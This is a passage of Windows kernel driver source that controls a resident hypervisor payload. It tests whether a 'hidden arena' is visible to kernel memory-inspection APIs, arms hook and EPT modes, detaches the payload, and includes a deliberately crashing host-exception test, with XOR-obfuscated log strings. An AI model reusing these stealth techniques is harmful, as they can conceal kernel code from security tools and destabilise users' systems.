        va = b;
        size = s;
        return true;
    };

    switch (kind)
    {
    case MAPCTL_MEMORY_AUDIT_KIND_IMAGE:
        choose(kind, ps.image_base, ps.image_size);
        break;
    case MAPCTL_MEMORY_AUDIT_KIND_ARENA:
        choose(kind, ps.arena_base, ps.arena_size);
        break;
    case MAPCTL_MEMORY_AUDIT_KIND_DIRECT:
        choose(kind, ps.direct_alloc_base, ps.direct_alloc_size);
        break;
    case MAPCTL_MEMORY_AUDIT_KIND_HOST_STACK:
        choose(kind, ps.host_stack_base, ps.host_stack_size);
        break;
    case MAPCTL_MEMORY_AUDIT_KIND_POOL_FIRST:
        if (ps.resident_pool_manifest && ps.resident_pool_count)
        {
            __try
            {
                auto blocks = (const payload_pool_block*)ps.resident_pool_manifest;
                choose(kind, blocks[0].va, blocks[0].bytes);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                va = 0;
                size = 0;
            }
        }
        break;
    default:
        break;
    }

    if (!va || !size)
    {
        if (!choose(MAPCTL_MEMORY_AUDIT_KIND_ARENA, ps.arena_base, ps.arena_size) &&
            !choose(MAPCTL_MEMORY_AUDIT_KIND_IMAGE, ps.image_base, ps.image_size) &&
            !choose(MAPCTL_MEMORY_AUDIT_KIND_DIRECT, ps.direct_alloc_base, ps.direct_alloc_size) &&
            !choose(MAPCTL_MEMORY_AUDIT_KIND_HOST_STACK, ps.host_stack_base, ps.host_stack_size))
        {
            return false;
        }
    }

    req->target_va = va;
    req->target_size = req->target_size ? req->target_size : 16;
    if (req->target_size > size)
        req->target_size = size;
    if (req->target_size > 64)
        req->target_size = 64;

    payload_u64 ops = req->flags ? req->flags : MAPCTL_MEMORY_AUDIT_OP_ALL;
    bool need_pa =
        (ops & MAPCTL_MEMORY_AUDIT_OP_MMCM_PA) ||
        (ops & MAPCTL_MEMORY_AUDIT_OP_MMMIO) ||
        (ops & MAPCTL_MEMORY_AUDIT_OP_MMGPA);
    if (!need_pa)
    {
        req->target_pa = 0;
        return true;
    }

    req->target_pa = mapdriver_mmtest_real_pa(va);
    return req->target_pa != 0;
}

static void mapdriver_mmtest_init_results(mapctl_mmtest* req)
{
    if (!req)
        return;

    req->mmcopy_virtual_status = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcopy_virtual_bytes = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcopy_virtual_qword = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcopy_physical_status = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcopy_physical_bytes = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcopy_physical_qword = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcvm_status = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcvm_bytes = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmcvm_qword = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmisav_result = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmmio_va = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmmio_qword = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmisavex_result = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->ntqvm_status = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->ntqvm_return_length = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->ntqvm_qword = MAPCTL_MEMORY_AUDIT_NOT_RUN;
    req->mmgpa_pa = MAPCTL_MEMORY_AUDIT_NOT_RUN;
}

static void mapdriver_mmtest_control(mapctl_mmtest* req)
{
    if (!req)
        return;

    req->magic = MAPCTL_MEMORY_AUDIT_MAGIC;
    req->size = sizeof(*req);
    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->flags = req->flags ? req->flags : MAPCTL_MEMORY_AUDIT_OP_ALL;
    if (req->flags & MAPCTL_MEMORY_AUDIT_OP_NOOP)
    {
        // Pure IOCTL smoke test: do not query payload status, do not issue
        // resident VMCALLs, do not resolve target PA, and do not call any MM
        // routine.  This distinguishes ctl/device routing from VT/MM paths.
        req->result = PAYLOAD_RESULT_OK;
        return;
    }

    payload_status before = {};
    if (!mapdriver_query_payload_status(&before) ||
        before.magic != PAYLOAD_STATUS_MAGIC ||
        !mapdriver_mmtest_pick_target(req, before))
    {
        return;
    }
    mapdriver_mmtest_snapshot(req, before, false);

    const payload_u64 ops = req->flags;
    mapdriver_mmtest_init_results(req);

    SIZE_T bytes = 0;
    UCHAR buffer[64] = {};
    SIZE_T test_size = (SIZE_T)req->target_size;
    if (!test_size || test_size > sizeof(buffer))
        test_size = sizeof(buffer);

    if (ops & MAPCTL_MEMORY_AUDIT_OP_PEEK)
    {
        __try
        {
            RtlFillMemory(buffer, sizeof(buffer), 0xCC);
            RtlCopyMemory(buffer, (const void*)req->target_va, test_size);
            req->mmcopy_virtual_status = 0;
            req->mmcopy_virtual_bytes = test_size;
            RtlCopyMemory(&req->mmcopy_virtual_qword, buffer, sizeof(req->mmcopy_virtual_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcopy_virtual_status = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMCM_VA)
    {
        __try
        {
            MM_COPY_ADDRESS src = {};
            src.VirtualAddress = (PVOID)req->target_va;
            RtlFillMemory(buffer, sizeof(buffer), 0xCC);
            bytes = 0;
            req->mmcopy_virtual_status = (payload_u64)MmCopyMemory(
                buffer,
                src,
                test_size,
                MM_COPY_MEMORY_VIRTUAL,
                &bytes);
            req->mmcopy_virtual_bytes = bytes;
            RtlCopyMemory(&req->mmcopy_virtual_qword, buffer, sizeof(req->mmcopy_virtual_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcopy_virtual_status = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMCM_PA)
    {
        __try
        {
            MM_COPY_ADDRESS src = {};
            src.PhysicalAddress.QuadPart = (LONGLONG)req->target_pa;
            RtlFillMemory(buffer, sizeof(buffer), 0xCC);
            bytes = 0;
            req->mmcopy_physical_status = (payload_u64)MmCopyMemory(
                buffer,
                src,
                test_size,
                MM_COPY_MEMORY_PHYSICAL,
                &bytes);
            req->mmcopy_physical_bytes = bytes;
            RtlCopyMemory(&req->mmcopy_physical_qword, buffer, sizeof(req->mmcopy_physical_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcopy_physical_status = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMCVM)
    {
        __try
        {
            RtlFillMemory(buffer, sizeof(buffer), 0xCC);
            bytes = 0;
            req->mmcvm_status = (payload_u64)MmCopyVirtualMemory(
                PsGetCurrentProcess(),
                (PVOID)req->target_va,
                PsGetCurrentProcess(),
                buffer,
                test_size,
                KernelMode,
                &bytes);
            req->mmcvm_bytes = bytes;
            RtlCopyMemory(&req->mmcvm_qword, buffer, sizeof(req->mmcvm_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcvm_status = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMISAV)
    {
        __try
        {
            req->mmisav_result = MmIsAddressValid((PVOID)req->target_va) ? 1ull : 0ull;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmisav_result = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMISAVEX)
    {
        __try
        {
            mapctl_hv_diag diag = {};
            if (mapdriver_get_resident_hv_diag(&diag) &&
                diag.mm_is_address_valid_ex_va)
            {
                using mmisavex_fn = BOOLEAN(*)(PVOID, ULONG_PTR);
                auto fn = (mmisavex_fn)diag.mm_is_address_valid_ex_va;
                req->mmisavex_result = fn((PVOID)req->target_va, 0) ? 1ull : 0ull;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmisavex_result = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMMIO)
    {
        __try
        {
            PHYSICAL_ADDRESS pa = {};
            pa.QuadPart = (LONGLONG)(req->target_pa & ~0xFFFull);
            PVOID mapped = MmMapIoSpace(pa, PAGE_SIZE, MmCached);
            req->mmmio_va = (payload_u64)mapped;
            if (mapped)
            {
                RtlCopyMemory(&req->mmmio_qword, mapped, sizeof(req->mmmio_qword));
                MmUnmapIoSpace(mapped, PAGE_SIZE);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmmio_va = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_NTQVM)
    {
        __try
        {
            mapctl_hv_diag diag = {};
            if (mapdriver_get_resident_hv_diag(&diag) &&
                diag.nt_query_virtual_memory_va)
            {
                using ntqvm_fn = NTSTATUS(*)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
                auto fn = (ntqvm_fn)diag.nt_query_virtual_memory_va;
                UCHAR mbi[128] = {};
                SIZE_T return_length = 0;
                req->ntqvm_status = (payload_u64)fn(
                    (HANDLE)(LONG_PTR)-1,
                    (PVOID)req->target_va,
                    0,
                    mbi,
                    sizeof(mbi),
                    &return_length);
                req->ntqvm_return_length = return_length;
                RtlCopyMemory(&req->ntqvm_qword, mbi, sizeof(req->ntqvm_qword));
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->ntqvm_status = (payload_u64)GetExceptionCode();
        }
    }

    if (ops & MAPCTL_MEMORY_AUDIT_OP_MMGPA)
    {
        __try
        {
            PHYSICAL_ADDRESS pa = MmGetPhysicalAddress((PVOID)req->target_va);
            req->mmgpa_pa = (payload_u64)pa.QuadPart;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmgpa_pa = (payload_u64)GetExceptionCode();
        }
    }

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
        mapdriver_mmtest_snapshot(req, after, true);

    req->result = PAYLOAD_RESULT_OK;
}

static void mapdriver_mmtest_noop_control(mapctl_mmtest* req)
{
    if (!req)
        return;

    payload_u64 flags = req->flags ? req->flags : MAPCTL_MEMORY_AUDIT_OP_NOOP;
    RtlZeroMemory(req, sizeof(*req));
    req->magic = MAPCTL_MEMORY_AUDIT_MAGIC;
    req->size = sizeof(*req);
    req->flags = flags;
    req->result = PAYLOAD_RESULT_OK;
    mapdriver_mmtest_init_results(req);

    const bool want_status =
        (flags & (MAPCTL_MEMORY_AUDIT_OP_STATUS_ONLY | MAPCTL_MEMORY_AUDIT_OP_STATUS_TWICE)) != 0;
    const bool use_arena_target = (flags & MAPCTL_MEMORY_AUDIT_OP_PEEK) != 0;

    if (want_status)
    {
        payload_status ps = {};
        if (mapdriver_query_payload_status(&ps) &&
            ps.magic == PAYLOAD_STATUS_MAGIC)
        {
            mapdriver_mmtest_snapshot(req, ps, false);
            req->target_kind = MAPCTL_MEMORY_AUDIT_KIND_ARENA;
            req->target_va = ps.arena_base;
            req->target_size = ps.arena_size;
        }
        else
        {
            req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
        }
    }

    if (use_arena_target)
    {
        req->target_kind = MAPCTL_MEMORY_AUDIT_KIND_ARENA;
        if (!req->target_va)
            req->target_va = (payload_u64)Utils::payloadArenaBase;

        payload_u64 arena_size = req->target_size;
        if (!arena_size)
            arena_size = Utils::payloadArenaSize;

        req->target_size = arena_size ? 16 : 0;
        if (req->target_size > arena_size)
            req->target_size = arena_size;
        if (req->target_size > 64)
            req->target_size = 64;

        if (req->target_va && req->target_size &&
            (flags & (MAPCTL_MEMORY_AUDIT_OP_MMCM_PA |
                      MAPCTL_MEMORY_AUDIT_OP_MMMIO |
                      MAPCTL_MEMORY_AUDIT_OP_MMGPA)))
        {
            req->target_pa = mapdriver_mmtest_real_pa(req->target_va);
            if (req->target_pa &&
                (flags & MAPCTL_MEMORY_AUDIT_OP_MMGPA) == 0)
                req->mmgpa_pa = req->target_pa;
        }
    }

    const SIZE_T arena_test_size =
        (use_arena_target && req->target_size) ? (SIZE_T)req->target_size : 0;

    if (use_arena_target && req->target_va && arena_test_size)
    {
        // Raw direct read of the hidden arena.  If an explicit MmCopyMemory-VA
        // op is also requested, that op overwrites the same output fields below.
        if (!(flags & MAPCTL_MEMORY_AUDIT_OP_MMCM_VA))
        {
            __try
            {
                UCHAR local_dst[64] = {};
                RtlCopyMemory(local_dst, (const void*)req->target_va, arena_test_size);
                req->mmcopy_virtual_status = 0;
                req->mmcopy_virtual_bytes = arena_test_size;
                RtlCopyMemory(&req->mmcopy_virtual_qword,
                              local_dst,
                              sizeof(req->mmcopy_virtual_qword));
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                req->mmcopy_virtual_status = (payload_u64)GetExceptionCode();
            }
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMCM_VA)
    {
        __try
        {
            payload_u64 local_src[2] = {
                0x1122334455667788ull,
                0x8877665544332211ull
            };
            UCHAR local_dst[64] = {};
            SIZE_T bytes = 0;
            MM_COPY_ADDRESS src = {};
            SIZE_T test_size = sizeof(local_src);
            if (use_arena_target && req->target_va && arena_test_size)
            {
                src.VirtualAddress = (PVOID)req->target_va;
                test_size = arena_test_size;
            }
            else
            {
                src.VirtualAddress = local_src;
            }
            req->mmcopy_virtual_status = (payload_u64)MmCopyMemory(
                local_dst,
                src,
                test_size,
                MM_COPY_MEMORY_VIRTUAL,
                &bytes);
            req->mmcopy_virtual_bytes = bytes;
            RtlCopyMemory(&req->mmcopy_virtual_qword,
                          local_dst,
                          sizeof(req->mmcopy_virtual_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcopy_virtual_status = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMCM_PA)
    {
        __try
        {
            payload_u64 local_src[2] = {
                0xAABBCCDDEEFF0011ull,
                0x1100FFEEDDCCBBAAull
            };
            UCHAR local_dst[64] = {};
            SIZE_T bytes = 0;
            PHYSICAL_ADDRESS pa = {};
            SIZE_T test_size = sizeof(local_src);
            if (use_arena_target && req->target_pa && arena_test_size)
            {
                pa.QuadPart = (LONGLONG)req->target_pa;
                test_size = arena_test_size;
            }
            else
            {
                pa = MmGetPhysicalAddress(local_src);
                req->mmgpa_pa = (payload_u64)pa.QuadPart;
            }
            MM_COPY_ADDRESS src = {};
            src.PhysicalAddress = pa;
            req->mmcopy_physical_status = (payload_u64)MmCopyMemory(
                local_dst,
                src,
                test_size,
                MM_COPY_MEMORY_PHYSICAL,
                &bytes);
            req->mmcopy_physical_bytes = bytes;
            RtlCopyMemory(&req->mmcopy_physical_qword,
                          local_dst,
                          sizeof(req->mmcopy_physical_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcopy_physical_status = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMCVM)
    {
        __try
        {
            payload_u64 local_src[2] = {
                0xCAFEBABE11223344ull,
                0x44332211BABECAFEull
            };
            UCHAR local_dst[64] = {};
            SIZE_T bytes = 0;
            PVOID from = local_src;
            SIZE_T test_size = sizeof(local_src);
            if (use_arena_target && req->target_va && arena_test_size)
            {
                from = (PVOID)req->target_va;
                test_size = arena_test_size;
            }
            req->mmcvm_status = (payload_u64)MmCopyVirtualMemory(
                PsGetCurrentProcess(),
                from,
                PsGetCurrentProcess(),
                local_dst,
                test_size,
                KernelMode,
                &bytes);
            req->mmcvm_bytes = bytes;
            RtlCopyMemory(&req->mmcvm_qword,
                          local_dst,
                          sizeof(req->mmcvm_qword));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmcvm_status = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMISAV)
    {
        __try
        {
            payload_u64 local_src = 0x123456789ABCDEF0ull;
            PVOID probe = &local_src;
            if (use_arena_target && req->target_va)
                probe = (PVOID)req->target_va;
            req->mmisav_result = MmIsAddressValid(probe) ? 1ull : 0ull;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmisav_result = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMISAVEX)
    {
        __try
        {
            mapctl_hv_diag diag = {};
            if (mapdriver_get_resident_hv_diag(&diag) &&
                diag.mm_is_address_valid_ex_va)
            {
                payload_u64 local_src = 0x456789ABCDEF0123ull;
                PVOID probe = &local_src;
                if (use_arena_target && req->target_va)
                    probe = (PVOID)req->target_va;
                using mmisavex_fn = BOOLEAN(*)(PVOID, ULONG_PTR);
                auto fn = (mmisavex_fn)diag.mm_is_address_valid_ex_va;
                req->mmisavex_result = fn(probe, 0) ? 1ull : 0ull;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmisavex_result = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMMIO)
    {
        __try
        {
            payload_u64 local_src[2] = {
                0x0F0E0D0C0B0A0908ull,
                0x08090A0B0C0D0E0Full
            };
            PHYSICAL_ADDRESS pa = {};
            payload_u64 offset = 0;
            if (use_arena_target && req->target_pa)
            {
                pa.QuadPart = (LONGLONG)(req->target_pa & ~0xFFFull);
                offset = req->target_pa & 0xFFFull;
            }
            else
            {
                pa = MmGetPhysicalAddress(local_src);
                offset = ((payload_u64)local_src) & 0xFFFull;
                pa.QuadPart &= ~0xFFFull;
                req->mmgpa_pa = (payload_u64)pa.QuadPart;
            }
            PVOID mapped = MmMapIoSpace(pa, PAGE_SIZE, MmCached);
            req->mmmio_va = (payload_u64)mapped;
            if (mapped)
            {
                RtlCopyMemory(&req->mmmio_qword,
                              (const void*)((payload_u64)mapped + offset),
                              sizeof(req->mmmio_qword));
                MmUnmapIoSpace(mapped, PAGE_SIZE);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmmio_va = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_NTQVM)
    {
        __try
        {
            mapctl_hv_diag diag = {};
            if (mapdriver_get_resident_hv_diag(&diag) &&
                diag.nt_query_virtual_memory_va)
            {
                payload_u64 local_src = 0x1020304050607080ull;
                PVOID probe = &local_src;
                if (use_arena_target && req->target_va)
                    probe = (PVOID)req->target_va;
                using ntqvm_fn = NTSTATUS(*)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
                auto fn = (ntqvm_fn)diag.nt_query_virtual_memory_va;
                UCHAR mbi[128] = {};
                SIZE_T return_length = 0;
                req->ntqvm_status = (payload_u64)fn(
                    (HANDLE)(LONG_PTR)-1,
                    probe,
                    0,
                    mbi,
                    sizeof(mbi),
                    &return_length);
                req->ntqvm_return_length = return_length;
                RtlCopyMemory(&req->ntqvm_qword, mbi, sizeof(req->ntqvm_qword));
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->ntqvm_status = (payload_u64)GetExceptionCode();
        }
    }

    if (flags & MAPCTL_MEMORY_AUDIT_OP_MMGPA)
    {
        __try
        {
            payload_u64 local_src = 0x55AA55AA11223344ull;
            PVOID probe = &local_src;
            if (use_arena_target && req->target_va)
                probe = (PVOID)req->target_va;
            PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(probe);
            req->mmgpa_pa = (payload_u64)pa.QuadPart;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            req->mmgpa_pa = (payload_u64)GetExceptionCode();
        }
    }

    if (want_status)
    {
        payload_status ps_after = {};
        if (mapdriver_query_payload_status(&ps_after) &&
            ps_after.magic == PAYLOAD_STATUS_MAGIC)
        {
            mapdriver_mmtest_snapshot(req, ps_after, true);
        }
        else
        {
            req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
        }
    }
}

static void mapdriver_vtret_mode_control(mapctl_vtret_mode* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_mode = 0;
    req->new_mode = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_VTRET_MODE_MAGIC ||
        req->size < sizeof(mapctl_vtret_mode) ||
        req->arm != MAPCTL_VTRET_MODE_ARM)
    {
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
        req->old_mode = before.vtret_mode;

    req->result = mapdriver_set_payload_mode(hv::payload_mode_vtret, req->mode);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_mode = after.vtret_mode;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
}

static void mapdriver_tramp_mode_control(mapctl_tramp_mode* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_mode = 0;
    req->new_mode = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_TRAMP_MODE_MAGIC ||
        req->size < sizeof(mapctl_tramp_mode) ||
        req->arm != MAPCTL_TRAMP_MODE_ARM)
    {
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
        req->old_mode = before.tramp_mode;

    if (req->mode)
    {
        payload_status hostmap_ps = {};
        if (!mapdriver_query_payload_status(&hostmap_ps) ||
            hostmap_ps.magic != PAYLOAD_STATUS_MAGIC ||
            !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "tramp-mode"))
        {
            return;
        }
    }

    req->result = mapdriver_set_payload_mode(hv::payload_mode_tramp, req->mode);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_mode = after.tramp_mode;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
}

static void mapdriver_hook_mode_control(mapctl_hook_mode* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_mode = 0;
    req->new_mode = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_HOOK_MODE_MAGIC ||
        req->size < sizeof(mapctl_hook_mode) ||
        req->arm != MAPCTL_HOOK_MODE_ARM)
    {
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
        req->old_mode = before.hook_mode;

    if (req->mode)
    {
        payload_status hostmap_ps = {};
        if (!mapdriver_query_payload_status(&hostmap_ps) ||
            hostmap_ps.magic != PAYLOAD_STATUS_MAGIC ||
            !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "hook-mode"))
        {
            return;
        }
    }

    req->result = mapdriver_set_payload_mode(hv::payload_mode_hook, req->mode);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_mode = after.hook_mode;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
}

static void mapdriver_ept_mode_control(mapctl_ept_mode* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_mode = 0;
    req->new_mode = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_EPT_MODE_MAGIC ||
        req->size < sizeof(mapctl_ept_mode) ||
        req->arm != MAPCTL_EPT_MODE_ARM)
    {
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
        req->old_mode = before.ept_mode;

    if (req->mode)
    {
        payload_status hostmap_ps = {};
        if (!mapdriver_query_payload_status(&hostmap_ps) ||
            hostmap_ps.magic != PAYLOAD_STATUS_MAGIC ||
            !mapdriver_map_payload_host_resident_ranges(hostmap_ps, "ept-mode"))
        {
            return;
        }
    }

    req->result = mapdriver_set_payload_mode(hv::payload_mode_ept, req->mode);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_mode = after.ept_mode;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
}

static void mapdriver_cutover_control(mapctl_cutover* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_target = 0;
    req->new_target = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_CUTOVER_MAGIC ||
        req->size < sizeof(mapctl_cutover) ||
        req->arm != MAPCTL_CUTOVER_ARM)
    {
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
        req->old_target = before.vmexit_bridge_target;

    req->result = mapdriver_set_payload_mode(hv::payload_mode_cutover, req->mode);

    payload_status after = {};
    if (mapdriver_query_payload_status(&after) && after.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->new_target = after.vmexit_bridge_target;
        RtlCopyMemory(&req->payload, &after, sizeof(after));
    }
}

static void mapdriver_hostex_test_control(mapctl_hostex_test* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    RtlZeroMemory(&req->before, sizeof(req->before));
    RtlZeroMemory(&req->after, sizeof(req->after));

    if (req->magic != MAPCTL_HOST_EXCEPTION_PROBE_MAGIC ||
        req->size < sizeof(mapctl_hostex_test) ||
        req->arm != MAPCTL_HOST_EXCEPTION_PROBE_ARM)
    {
        return;
    }

    mapdriver_query_payload_status(&req->before);

    // This is intentionally destructive when it succeeds: the payload executes
    // an invalid RDMSR in VMX-root without the safe-probe convention.  The
    // expected result is host IDT catch -> panic landing -> guest bugcheck.
    req->result = mapdriver_set_payload_mode(
        hv::payload_mode_hostex_test,
        req->mode ? req->mode : PAYLOAD_HOST_EXCEPTION_MODE_UD2);

    mapdriver_query_payload_status(&req->after);
}

static void mapdriver_legacy_detach_control(mapctl_legacy_detach* req)
{
    if (!req)
        return;

    req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
    req->old_flags = 0;
    req->new_flags = 0;
    req->ghv_original = 0;
    req->ghv_copy = 0;
    req->ghv_size = 0;
    req->vt_hook_original = 0;
    req->vt_hook_copy = 0;
    req->vt_hook_size = 0;
    req->shadow_base = 0;
    req->shadow_size = 0;
    req->shadow_count = 0;
    req->stage = 0;
    req->diag_copied = 0;
    req->diag_magic = 0;
    req->diag_version = 0;
    req->diag_ghv = 0;
    req->diag_ghv_size = 0;
    req->diag_vt_hook = 0;
    req->diag_vt_hook_bytes = 0;
    req->export_table = (payload_u64)Utils::payloadExports;
    req->export_flags = 0;
    RtlZeroMemory(&req->payload, sizeof(req->payload));

    if (req->magic != MAPCTL_LEGACY_DETACH_MAGIC ||
        req->size < sizeof(mapctl_legacy_detach) ||
        req->arm != MAPCTL_LEGACY_DETACH_ARM)
    {
        req->stage = 1;
        return;
    }

    payload_status before = {};
    if (mapdriver_query_payload_status(&before) && before.magic == PAYLOAD_STATUS_MAGIC)
    {
        req->old_flags = before.legacy_detach_flags;
        req->ghv_original = before.legacy_ghv_original;
        req->ghv_copy = before.legacy_ghv_copy;
        req->ghv_size = before.legacy_ghv_size;
        req->vt_hook_original = before.legacy_vt_hook_original;
        req->vt_hook_copy = before.legacy_vt_hook_copy;
        req->vt_hook_size = before.legacy_vt_hook_size;
        req->shadow_base = before.legacy_shadow_base;
        req->shadow_size = before.legacy_shadow_size;
        req->shadow_count = before.legacy_shadow_count;
        RtlCopyMemory(&req->payload, &before, sizeof(before));
    }

    // Do not run the heavy legacy-data allocator/copy from the VM-exit
    // root-mode VMCALL path.  legacy arm must be done before handoff while
    // payload exports are still callable in normal kernel context; after
    // handoff this IOCTL only reports an already completed detach.
    if (g_payload_detached &&
        ((req->old_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
    {
        req->stage = 2;
        LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked after handoff: run legacy arm before handoff\n"));
        return;
    }

    if (!g_payload_detached)
    {
        if (!Utils::payloadExports ||
            !Utils::payloadExports->set_hv_diag ||
            !Utils::payloadExports->detach_legacy_data)
        {
            req->stage = 3;
            req->export_table = (payload_u64)Utils::payloadExports;
            req->export_flags =
                (Utils::payloadExports ? 1ull : 0ull) |
                ((Utils::payloadExports && Utils::payloadExports->set_hv_diag) ? 2ull : 0ull) |
                ((Utils::payloadExports && Utils::payloadExports->detach_legacy_data) ? 4ull : 0ull);
            return;
        }
        req->export_table = (payload_u64)Utils::payloadExports;
        req->export_flags = 0x7;

        mapctl_hv_diag diag = {};
        bool diag_ok = false;
        __try
        {
            auto copied = mapdriver_get_resident_hv_diag(&diag);
            req->diag_copied = copied;
            diag_ok = mapdriver_hv_diag_valid(diag, copied) &&
                diag.ghv &&
                diag.ghv_size &&
                diag.vt_hook_table_ptr &&
                (diag.vt_hook_table_bytes ||
                    (diag.vt_hook_slot_count && diag.vt_hook_slot_size));
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            diag_ok = false;
        }
        req->diag_magic = diag.magic;
        req->diag_version = diag.version;
        req->diag_ghv = diag.ghv;
        req->diag_ghv_size = diag.ghv_size;
        req->diag_vt_hook = diag.vt_hook_table_ptr;
        req->diag_vt_hook_bytes = diag.vt_hook_table_bytes ?
            diag.vt_hook_table_bytes :
            (diag.vt_hook_slot_count * diag.vt_hook_slot_size);

        if (!diag_ok)
        {
            req->stage = 4;
